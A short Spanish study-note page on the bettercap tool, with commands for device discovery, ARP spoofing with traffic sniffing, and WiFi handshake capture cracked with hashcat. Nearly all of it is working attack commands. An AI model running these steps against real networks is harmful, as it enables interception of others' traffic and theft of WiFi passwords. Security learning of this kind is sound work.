Herramienta para monitorear y capturar trafico de red

# Ejemplos de uso
## Encontrar dispositivos dentro de una red
bettercap permite encontrar los dispositivos conectados a una red, dando información sobre su [[IP|IPv4]], [[MAC]] y modelo del dispositivo
`net.probe on`
`net.show`
En este punto, es visible una tabla que muestra de forma ordenada toda la información capturada por el primer comando

## [[ARP spoofing]]
`set.arp.spoof.targets <ip>`
`arp.spoof on`
`net.sniff on`
## Captura handshakes + hashcat
Para este ejemplo, la tarjeta de red debe estar previamente configurada en modo monitor
`sudo bettercap`
`set wifi.interface (nombre interfaz)`
`set wifi.handshakes.file (archivo .pcap de output)`
`wifi.recon on`
`wifi.show`
`events.stream off`
`wifi.assoc ([[BSSID]] de la red objetivo)`
`events.stream on`
`exit`
`[[hcxpcapngtool]] -o (archivo para output) (archivo .pcap anterior)` 
`hashcat -m 22000 (output del comando aterior) (diccionario)`
En este caso, el 22000 esta estableciendo el tipo de [[hash]], el usado es el correspondiente a protocolos de red